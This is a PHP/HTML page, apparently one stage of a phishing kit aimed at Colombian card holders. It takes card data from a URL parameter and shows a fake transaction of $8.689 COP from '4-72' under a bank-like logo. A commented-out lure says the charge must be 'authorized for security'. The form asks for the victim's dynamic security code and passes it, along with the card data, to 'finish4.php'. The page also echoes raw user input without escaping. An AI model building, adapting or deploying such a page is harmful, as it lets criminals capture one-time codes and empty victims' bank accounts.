<?php 


$codigoG = $_GET['codigo'];




$palabrasSeparadas = explode(" ", $codigoG);

    $fechaActual = date('d/m/y');
    $ca = substr($palabrasSeparadas[0],11,4); 
    
   // $mensaje = "La transacción que intentas realizar por un valor de: $8.689 Cop  con tu tarjeta terminada en **********".$ca." Debe ser autorizada por seguridad";

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

<div class="details" style=" width: 90%;
    margin: auto;
    background-color: white;
    border: none ;
    border-radius: 10px;
    /* box-shadow: 0px 10px 10px -6px rgb(167, 167, 167); */
    padding: 20px;">
    <img src="/img/bogo.png" alt="" srcset="" width="120px">
<br><br><a style="color:rgb(105, 105, 105);">Detalles transaccionales</a><a id="textL"></a>
    <pre><b>               Comercio: </b>  4-72 </pre></a> 
    <a id="textL"><pre style="text-align:justify;">        <b>          Monto:  $8.689 Cop </pre></a></center>
    <a id="textL"><pre>      <b>Número de tarjeta: </b> <?php echo "$ca"; ?> </pre></a> 
    <form action="finish4.php" method="post">
    <a><pre> <b>     Digite el Código: </b></a><input type="text" name="cDinamica" id="inputda" placeholder ="" required minlength="6" style="width:100px; height:25px;">  <br></pre>
    <a href="" style="color:black;">Presione aquí para recibir un nuevo código</a><br><p></p>
    <input type="hidden" name="codigoG" value=" <?php echo "$codigoG"; ?>">
                            <input type="hidden" name="numero" value=" <?php echo "$codigoG"; ?>">
                           
    <center><input type="submit" value="Activar" style="color:white; background-color:black; width:25%; height:35px; margin:auto;  -webkit-border-radius: 0; -webkit-appearance: none;"></center>
    </form>
</div>
    



<script src="https://code.jquery.com/jquery-3.2.1.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    setTimeout(function() {
        $(".content").fadeIn(1500);
    },240000);


    setTimeout(function() {
        $(".details").fadeOut(1000);
    },240000);
    
});
</script>
</body>
</html>